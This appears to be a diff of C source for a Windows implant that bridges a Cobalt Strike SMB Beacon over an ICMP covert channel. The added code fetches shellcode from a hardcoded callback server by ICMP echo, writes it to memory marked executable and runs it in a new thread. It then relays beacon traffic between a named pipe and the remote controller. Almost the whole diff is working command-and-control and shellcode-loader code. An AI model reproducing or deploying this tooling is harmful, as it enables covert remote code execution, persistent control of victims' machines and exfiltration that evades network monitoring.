@@ -43,6 +43,17 @@ Max is 1472, which is the the MTU of 1500 - 20 for IPV4, and 8 for ICMP header
 #define ICMP_CALLBACK_SERVER "172.19.241.197"
 //4 Byte tag that is icnluded in each payload. Change to whatever you want, as long as it's 4 bytes
 #define ICMP_TAG "RQ47"
+/*
+Named Pipe to connect your beacon to
+
+This should match the "pipename" option provided to the TeamServer by the controller
+
+ex: 
+    pipename="mypipe" -> `#define PIPENAME "\\\\.\\pipe\\mypipe"`
+
+*/
+#define PIPENAME "\\\\.\\pipe\\foobar"
+
 
 //Cobalt Strike Settings - Don't touch
 #define PAYLOAD_MAX_SIZE 512 * 1024
@@ -77,10 +88,13 @@ int received_chunks = 0;
 int total_chunks = 0;
 int received_map[1000]; // track received fragments (max 1000)
 
-// Forward declarations
+// Prototypes
 int  send_icmp(SOCKET s, struct sockaddr_in* dest, const char* payload, int payload_len, USHORT seq_num);
 char* recv_icmp_fragments(SOCKET s);
 char* recv_icmp(SOCKET s);
+DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max);
+void write_frame(HANDLE my_handle, char * buffer, DWORD length);
+int bridge_to_beacon();
 
 // Reads a “frame” from the given HANDLE by first reading a 4‐byte length, then that many bytes.
 DWORD read_frame(HANDLE my_handle, char * buffer, DWORD max) {
@@ -335,6 +349,50 @@ char* recv_icmp(SOCKET s) {
     return out_data;
 }
 
+/*
+Gets payload, returns char * to shellcode
+
+*/
+char* get_payload(SOCKET s) {
+    //socket setup
+    struct sockaddr_in dest;
+    dest.sin_family = AF_INET;
+    dest.sin_addr.s_addr = inet_addr(ICMP_CALLBACK_SERVER);
+
+    //get payload
+    // 1) Build “seq=0” size packet
+    //    Suppose we expect the server payload to be at most PAYLOAD_MAX_SIZE.
+    uint32_t expected_server_payload = PAYLOAD_MAX_SIZE;
+    uint32_t netlen = htonl(expected_server_payload);
+
+    char size_buf[ICMP_PAYLOAD_SIZE] = { 0 };
+    //// Copy “RQ47”
+    memcpy(size_buf, ICMP_TAG, TAG_SIZE);
+    //// Then 4-byte big-endian length
+    memcpy(size_buf + TAG_SIZE, &netlen, sizeof(netlen));
+    //Total payload length = TAG_SIZE + sizeof(netlen) = 8 bytes
+    int size_payload_len = TAG_SIZE + sizeof(netlen);
+
+    //// Send seq=0 Echo Request
+    if (send_icmp(s, &dest, size_buf, size_payload_len, 0) != 0) {
+        printf("[-] Failed to send seq=0 packet\n");
+        closesocket(s);
+        return 1;
+    }
+
+    //// 2) Wait for and reassemble all fragments (Echo Replies)
+    char* shellcode = recv_icmp_fragments(s);
+    if (!shellcode) {
+        printf("[-] Failed to receive full payload\n");
+        closesocket(s);
+        return 1;
+    }
+
+    
+    printf("[+] Received full payload: first 256 bytes as string:\n    %.256s\n", shellcode);
+    return shellcode;
+}
+
 //
 // bridge_to_beacon: high-level flow
 //   1) Create raw ICMP socket
@@ -344,178 +402,148 @@ char* recv_icmp(SOCKET s) {
 //   5) Inject payload (as a new thread) and then relay any further traffic via named pipe
 //
 int bridge_to_beacon() {
-   printf("[+] Creating raw socket...\n");
-   SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
-   if (s == INVALID_SOCKET) {
-       printf("[-] Error creating socket: %d\n", WSAGetLastError());
-       return 1;
-   }
+    printf("[+] Creating raw socket...\n");
+    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
+    if (s == INVALID_SOCKET) {
+        printf("[-] Error creating socket: %d\n", WSAGetLastError());
+        return 1;
+    }
 
-   // Optional: set recv timeout so we don’t block forever
-//    int timeout_ms = 5000; // 5 seconds
-//    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
+    // Optional: set recv timeout so we don’t block forever
+    //    int timeout_ms = 5000; // 5 seconds
+    //    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
 
-   struct sockaddr_in dest;
-   dest.sin_family = AF_INET;
-   dest.sin_addr.s_addr = inet_addr(ICMP_CALLBACK_SERVER);
+    struct sockaddr_in dest;
+    dest.sin_family = AF_INET;
+    dest.sin_addr.s_addr = inet_addr(ICMP_CALLBACK_SERVER);
 
-//    //get payload
-//    // 1) Build “seq=0” size packet
-//    //    Suppose we expect the server payload to be at most PAYLOAD_MAX_SIZE.
-//    uint32_t expected_server_payload = PAYLOAD_MAX_SIZE;
-//    uint32_t netlen = htonl(expected_server_payload);
+    //Grab payload over ICMP Bridge
+    char * shellcode = get_payload(s);
+    unsigned int shellcode_len = (unsigned int)sizeof(shellcode);
 
-//    char size_buf[ICMP_PAYLOAD_SIZE] = { 0 };
-//    //// Copy “RQ47”
-//    memcpy(size_buf, ICMP_TAG, TAG_SIZE);
-//    //// Then 4-byte big-endian length
-//    memcpy(size_buf + TAG_SIZE, &netlen, sizeof(netlen));
-//    //Total payload length = TAG_SIZE + sizeof(netlen) = 8 bytes
-//    int size_payload_len = TAG_SIZE + sizeof(netlen);
+    ///////////////////////////////////////////////////////////////////////
+    //// 1) Allocate R/W memory, copy your x64 shellcode, make it executable
+    ///////////////////////////////////////////////////////////////////////
 
-//    //// Send seq=0 Echo Request
-//    if (send_icmp(s, &dest, size_buf, size_payload_len, 0) != 0) {
-//       printf("[-] Failed to send seq=0 packet\n");
-//       closesocket(s);
-//       return 1;
-//    }
+    printf("[+] Allocating memory");
+    LPVOID exec_mem = VirtualAlloc(
+        NULL,
+        shellcode_len,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE
+    );
+    if (!exec_mem) {
+        printf("[-] VirtualAlloc failed: %u\n", GetLastError());
+        return 1;
+    }
 
-//    //// 2) Wait for and reassemble all fragments (Echo Replies)
-//    char* shellcode = recv_icmp_fragments(s);
-//    if (!shellcode) {
-//       printf("[-] Failed to receive full payload\n");
-//       closesocket(s);
-//       return 1;
-//    }
+    // Copy in the shellcode bytes
+    RtlMoveMemory(exec_mem, shellcode, shellcode_len);
 
-//    printf("[+] Received full payload: first 256 bytes as string:\n    %.256s\n", shellcode);
+    // Change to R/X so CreateThread can jump into it
+    printf("[+] Changing to R/X");
+    DWORD old_prot;
+    if (!VirtualProtect(exec_mem, shellcode_len, PAGE_EXECUTE_READ, &old_prot)) {
+        printf("[-] VirtualProtect failed: %u\n", GetLastError());
+        return 1;
+    }
 
-//    ///////////////////////////////////////////////////////////////////////
-//    //// 1) Allocate R/W memory, copy your x64 shellcode, make it executable
-//    ///////////////////////////////////////////////////////////////////////
-//    unsigned int shellcode_len = (unsigned int)sizeof(shellcode);
+    ///////////////////////////////////////////////////////////////////////
+    //// 2) Create a thread off of that exec_mem so the SMB Beacon actually runs
+    ///////////////////////////////////////////////////////////////////////
+    printf("[+] Creating Thread");
 
-//    printf("[+] Allocating memory");
-//    LPVOID exec_mem = VirtualAlloc(
-//       NULL,
-//       shellcode_len,
-//       MEM_COMMIT | MEM_RESERVE,
-//       PAGE_READWRITE
-//    );
-//    if (!exec_mem) {
-//       printf("[-] VirtualAlloc failed: %u\n", GetLastError());
-//       return 1;
-//    }
+    HANDLE hShellcode = CreateThread(
+        NULL,                        // default security
+        0,                           // default stack
+        (LPTHREAD_START_ROUTINE)exec_mem,
+        NULL,                        // no parameters
+        0,                           // run immediately
+        NULL                         // no thread ID needed
+    );
+    if (!hShellcode) {
+        printf("[-] CreateThread(shellcode) failed: %u\n", GetLastError());
+        return 1;
+    }
+    printf("[+] Spawned shellcode thread: handle = %p\n", hShellcode);
 
-//    // Copy in the shellcode bytes
-//    RtlMoveMemory(exec_mem, shellcode, shellcode_len);
+    /////////////////////////////////////////////////////////////////////
+    // 3) Now wait for the SMB Beacon to land and create \\.\pipe\foobar
+    /////////////////////////////////////////////////////////////////////
+    printf("[+] Bridging to Named Pipe\n");
+    HANDLE handle_beacon = INVALID_HANDLE_VALUE;
+    while (handle_beacon == INVALID_HANDLE_VALUE) {
+        Sleep(1000); // sleep is here to make sure the pipe gets spun up, instead of infinitely looping over it .
+        //remember, beacon is the one that opens the pipe, so if it doesn't run, we get no pipe :(
+        handle_beacon = CreateFileA(
+            PIPENAME,
+            GENERIC_READ | GENERIC_WRITE,
+            0,
+            NULL,
+            OPEN_EXISTING,
+            SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, //connect to pipe anonymously
+            NULL 
+        );
+        if (handle_beacon == INVALID_HANDLE_VALUE) {
+            DWORD err = GetLastError();
+            printf("[*] CreateFileA still invalid (err=%u), retrying...\n", err);
+        }
+    }
+    printf("[+] Connected to pipe: handle_beacon = %p\n", handle_beacon);
 
-//    // Change to R/X so CreateThread can jump into it
-//    printf("[+] Changing to R/X");
-//    DWORD old_prot;
-//    if (!VirtualProtect(exec_mem, shellcode_len, PAGE_EXECUTE_READ, &old_prot)) {
-//       printf("[-] VirtualProtect failed: %u\n", GetLastError());
-//       return 1;
-//    }
+    printf("[+] Allocating Pipe buffer\n");
+    char* pipe_buffer = (char*)malloc(BUFFER_MAX_SIZE);
+    if (!pipe_buffer) {
+        DWORD err = GetLastError();
+        printf("[*] MALLOC for pipe_buffer failed (err=%u)\n", err);
+        closesocket(s);
+        CloseHandle(handle_beacon);
+        return 1;
+    }
 
-//    ///////////////////////////////////////////////////////////////////////
-//    //// 2) Create a thread off of that exec_mem so the SMB Beacon actually runs
-//    ///////////////////////////////////////////////////////////////////////
-//    printf("[+] Creating Thread");
+    /////////////////////////////////////////////////////////////////////
+    // X) Beacon comms loop
+    /////////////////////////////////////////////////////////////////////
+    printf("[+] Starting beacon read loop\n");
+    while (TRUE) {
+        // Read from beacon’s pipe
+        DWORD beacon_output = read_frame(handle_beacon, pipe_buffer, BUFFER_MAX_SIZE);
+        //may need to disable this for testing:
+        if (beacon_output == 0 || beacon_output == (DWORD)-1) {
+            printf("[+] No data, exiting\n");
+            break;
+        }
 
-//    HANDLE hShellcode = CreateThread(
-//       NULL,                        // default security
-//       0,                           // default stack
-//       (LPTHREAD_START_ROUTINE)exec_mem,
-//       NULL,                        // no parameters
-//       0,                           // run immediately
-//       NULL                         // no thread ID needed
-//    );
-//    if (!hShellcode) {
-//       printf("[-] CreateThread(shellcode) failed: %u\n", GetLastError());
-//       return 1;
-//    }
-//    printf("[+] Spawned shellcode thread: handle = %p\n", hShellcode);
+        // Construct chunk payload: TAG + data
+        int data_len = (int)beacon_output;
+        if (data_len > ICMP_PAYLOAD_SIZE - TAG_SIZE) {
+            data_len = ICMP_PAYLOAD_SIZE - TAG_SIZE;
+        }
+        char chunk_buf[ICMP_PAYLOAD_SIZE] = { 0 };
+        memcpy(chunk_buf, ICMP_TAG, TAG_SIZE);
+        memcpy(chunk_buf + TAG_SIZE, pipe_buffer, data_len);
+        int chunk_payload_len = TAG_SIZE + data_len;
 
-   /////////////////////////////////////////////////////////////////////
-   // 3) Now wait for the SMB Beacon to land and create \\.\pipe\foobar
-   /////////////////////////////////////////////////////////////////////
-   printf("[+] Bridging to Named Pipe\n");
-   HANDLE handle_beacon = INVALID_HANDLE_VALUE;
-   while (handle_beacon == INVALID_HANDLE_VALUE) {
-       Sleep(1000);
-       //err2 = file not found
-       handle_beacon = CreateFileA(
-           "\\\\.\\pipe\\foobar",
-           GENERIC_READ | GENERIC_WRITE,
-           0,
-           NULL,
-           OPEN_EXISTING,
-           SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS,
-           NULL );
-       if (handle_beacon == INVALID_HANDLE_VALUE) {
-           DWORD err = GetLastError();
-           // ERROR_FILE_NOT_FOUND (2) or ERROR_PIPE_BUSY (231) is expected until
-           // the Beacon actually opens the pipe from Cobalt Strike’s side.
-           printf("[*] CreateFileA still invalid (err=%u), retrying...\n", err);
-       }
-   }
+        // Send as an Echo Request with seq=1
+        send_icmp(s, &dest, chunk_buf, chunk_payload_len, 1);
 
-   printf("[+] Connected to pipe: handle_beacon = %p\n", handle_beacon);
+        // Wait for controller’s response (type 0)
+        char* controller_resp = recv_icmp(s);
+        if (controller_resp) {
+            //write back to beacon with response
+            write_frame(handle_beacon, controller_resp, (DWORD)strlen(controller_resp));
+            free(controller_resp);
+        }
 
-//    printf("[+] Injecting payload into memory w/ CreateThread\n");
-//    //// 3) Inject the payload into memory and start executing it
-//    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcode, NULL, 0, NULL);
+        Sleep(SLEEP_TIME);
+    }
 
-   printf("[+] Allocating Pipe buffer\n");
-   char* pipe_buffer = (char*)malloc(BUFFER_MAX_SIZE);
-   if (!pipe_buffer) {
-       perror("malloc");
-       closesocket(s);
-       CloseHandle(handle_beacon);
-       return 1;
-   }
-
-   printf("[+] Starting beacon read loop\n");
-   while (TRUE) {
-       // Read from beacon’s pipe
-       DWORD beacon_output = read_frame(handle_beacon, pipe_buffer, BUFFER_MAX_SIZE);
-       if (beacon_output == 0 || beacon_output == (DWORD)-1) {
-           printf("[+] No data, exiting\n");
-           break;
-       }
-
-       // Construct chunk payload: TAG + data
-       int data_len = (int)beacon_output;
-       if (data_len > ICMP_PAYLOAD_SIZE - TAG_SIZE) {
-           data_len = ICMP_PAYLOAD_SIZE - TAG_SIZE;
-       }
-       char chunk_buf[ICMP_PAYLOAD_SIZE] = { 0 };
-       memcpy(chunk_buf, ICMP_TAG, TAG_SIZE);
-       memcpy(chunk_buf + TAG_SIZE, pipe_buffer, data_len);
-       int chunk_payload_len = TAG_SIZE + data_len;
-
-       // Send as an Echo Request with seq=1
-       send_icmp(s, &dest, chunk_buf, chunk_payload_len, 1);
-
-       // Wait for controller’s response (type 0)
-       char* controller_resp = recv_icmp(s);
-       if (controller_resp) {
-           write_frame(handle_beacon, controller_resp, (DWORD)strlen(controller_resp));
-           free(controller_resp);
-       }
-
-       Sleep(SLEEP_TIME);
-   }
-
-   // Cleanup
-   free(pipe_buffer);
-   CloseHandle(handle_beacon);
-   closesocket(s);
-   return 0;
+    // Cleanup
+    free(pipe_buffer);
+    CloseHandle(handle_beacon);
+    closesocket(s);
+    return 0;
 }
-
-
 
 void debug_constants() {
     printf("ICMP_ECHO: %d\n", ICMP_ECHO);
@@ -527,6 +555,7 @@ void debug_constants() {
     printf("MAX_PACKET_SIZE: %d\n", MAX_PACKET_SIZE);
     printf("ICMP_CALLBACK_SERVER: %s\n", ICMP_CALLBACK_SERVER);
     printf("ICMP_TAG: %s\n", ICMP_TAG);
+    printf("PIPENAME: %s", PIPENAME);
 }
 
 int main() {
@@ -538,11 +567,10 @@ int main() {
 	wVersionRequested = MAKEWORD(2, 2);
 	WSAStartup(wVersionRequested, &wsaData);
 
-
+    //run beacon logic
     int result = bridge_to_beacon();
     
-    //go();
+    //cleanup afterwards
     WSACleanup();
-    //return result;
     return 0;
 }
